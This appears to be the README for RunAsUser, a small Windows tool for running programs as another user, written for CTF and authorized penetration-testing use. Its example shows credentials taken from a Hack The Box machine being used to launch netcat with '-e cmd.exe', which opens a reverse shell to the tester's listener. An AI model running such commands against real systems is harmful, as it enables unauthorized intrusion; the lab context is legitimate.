# RunAsUser

**Advisory**
All the binaries/scripts/code of RunAsUser should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own networks and/or with the network owner's permission.
* * *

**Binary already compiled in Releases if you want to use that.**
* * *

**Whats the purpose?**

RunAsUser was designed to make it easy to execute programs on Windows as another user. In CTF exercises you may come across credentials for another user. Unlike Linux there isn't the functionality to "su" to switch user.

There are ways to already do this with PowerShell. However I have found that in some CTF exercises you may be presented with limited or no PowerShell functionality. CMD also has the ability to execute programs as another user but again I have experienced problems trying to use that.

I have used this in a few boxes now and found it very useful. In fact, I made this application because I faced a very specific issue and other solutions wouldn't work.

It is a quick and dirty tool but does the job. I may come back to it and update it at some point.

**How to run**

So an example machine you can use this on is - HTB JSON.

Found the credentials for the admin user. I had issues trying to run a PowerShell terminal from what I remember, so I used this. I know I could have done this particular box lots of other ways but on other machines you may not be so fortunate and it was a good excuse to use this tool again.

First I uploaded RunAsUser.exe and then executed the below command.

```
RunAsUser.exe -u superadmin -p funnyhtb -f c:\users\public\nc.exe -a '10.10.14.12 9001 -e cmd.exe'
```

This command then executed `nc.exe` as the `superadmin` user and it connected back to my listener.

To view the help, simply run the tool with either `-h` or `--help`.

You may also just run the tool and you will be prompted at each step for the arguments you wish to supply.

**Edit**

I have updated this README to show an example of where "runas" does not work and "RunAsUser" does work. I created this tool for this exact reason. I was on a machine and had credentials and my initial thought was runas, however this would not work and kept skipping over the password prompt. I am aware there are other solutions to do the same thing, but I enjoyed making this quick tool and thought I would share it.

![](RunAsUser.gif)

